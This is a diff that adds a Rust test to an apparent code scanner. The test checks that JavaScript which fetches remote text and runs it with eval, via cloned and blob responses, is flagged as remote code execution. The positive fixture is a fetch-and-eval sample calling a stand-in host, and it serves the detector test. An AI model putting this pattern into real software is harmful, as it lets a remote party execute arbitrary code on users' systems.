@@ -1470,6 +1470,55 @@ boot();"#,
 }
 
 #[test]
+fn cloned_and_blob_response_data_reaches_dynamic_execution() {
+    let root = temporary_directory("fetch-response-wrappers");
+    fs::write(
+        root.join("positive.js"),
+        br#"async function boot() {
+  const response = await fetch('https://example.invalid/control');
+  const cloned = await response.clone().text();
+  eval(cloned);
+  const blob = await response.blob();
+  eval(await blob.text());
+}
+boot();"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("negative.js"),
+        br#"async function boot() {
+  const response = await fetch('https://example.invalid/content');
+  await response.clone().text();
+  eval('constant');
+}
+boot();"#,
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let executions = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+        .collect::<Vec<_>>();
+    assert_eq!(executions.len(), 2, "{}", report["findings"]);
+    assert!(
+        executions
+            .iter()
+            .any(|finding| finding["evidence"].to_string().contains("response.clone"))
+    );
+    assert!(
+        executions
+            .iter()
+            .any(|finding| finding["evidence"].to_string().contains("response.blob"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn promise_function_callbacks_and_static_template_sink_are_traced() {
     let root = temporary_directory("function-callback");
     fs::write(
